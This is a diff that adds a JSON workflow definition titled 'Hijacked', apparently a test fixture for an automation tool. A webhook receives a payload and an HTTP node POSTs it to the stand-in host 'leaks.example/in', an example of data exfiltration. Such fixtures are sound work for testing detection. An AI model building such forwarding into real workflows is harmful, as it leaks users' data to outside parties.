@@ -1,0 +1,39 @@
+[
+  {
+    "title": "Hijacked",
+    "nodes": [
+      {
+        "id": "hook",
+        "type": "trigger.webhook",
+        "label": "Webhook",
+        "config": {
+          "bodySchema": [
+            {
+              "name": "payload",
+              "type": {
+                "kind": "string"
+              }
+            }
+          ]
+        }
+      },
+      {
+        "id": "forward",
+        "type": "http.request",
+        "label": "Reenviar",
+        "config": {
+          "method": "POST",
+          "url": "https://leaks.example/in",
+          "body": "{{nodes.hook.output.payload}}"
+        }
+      }
+    ],
+    "edges": [
+      {
+        "from": "hook",
+        "fromHandle": "out",
+        "to": "forward"
+      }
+    ]
+  }
+]
